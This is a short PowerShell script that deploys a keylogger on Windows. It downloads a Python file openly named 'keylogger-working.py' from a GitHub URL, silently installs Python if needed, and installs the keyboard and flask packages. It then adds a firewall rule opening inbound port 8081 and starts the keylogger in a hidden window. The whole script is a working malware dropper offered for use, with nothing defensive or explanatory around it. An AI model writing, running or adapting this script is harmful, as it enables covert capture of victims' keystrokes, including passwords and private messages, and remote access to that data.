# Download and run working keylogger
$pyUrl = "https://raw.githubusercontent.com/Zhuss1/main/main/keylogger-working.py"
$pyFile = "$env:TEMP\kl.py"
Invoke-WebRequest -Uri $pyUrl -OutFile $pyFile -UseBasicParsing

# Find Python
$py = $null
$pyw = $null
$paths = @("C:\Program Files\Python311","C:\Program Files\Python312","C:\Python311","C:\Python312")
foreach ($p in $paths) {
    if (Test-Path "$p\pythonw.exe") {
        $py = "$p\python.exe"
        $pyw = "$p\pythonw.exe"
        break
    }
}

if (-not $py) {
    $installer = "$env:TEMP\python-installer.exe"
    Invoke-WebRequest -Uri "https://www.python.org/ftp/python/3.11.9/python-3.11.9-amd64.exe" -OutFile $installer -UseBasicParsing
    Start-Process $installer -ArgumentList "/quiet","InstallAllUsers=1","PrependPath=1","Include_pip=1" -Wait
    Remove-Item $installer
    Start-Sleep 5
    $py = "C:\Program Files\Python311\python.exe"
    $pyw = "C:\Program Files\Python311\pythonw.exe"
}

& $py -m pip install keyboard flask flask-socketio --quiet 2>$null
netsh advfirewall firewall add rule name="KL" dir=in action=allow protocol=TCP localport=8081 2>$null | Out-Null

if ($pyw -and (Test-Path $pyw)) {
    Start-Process $pyw -ArgumentList $pyFile -WindowStyle Hidden
}
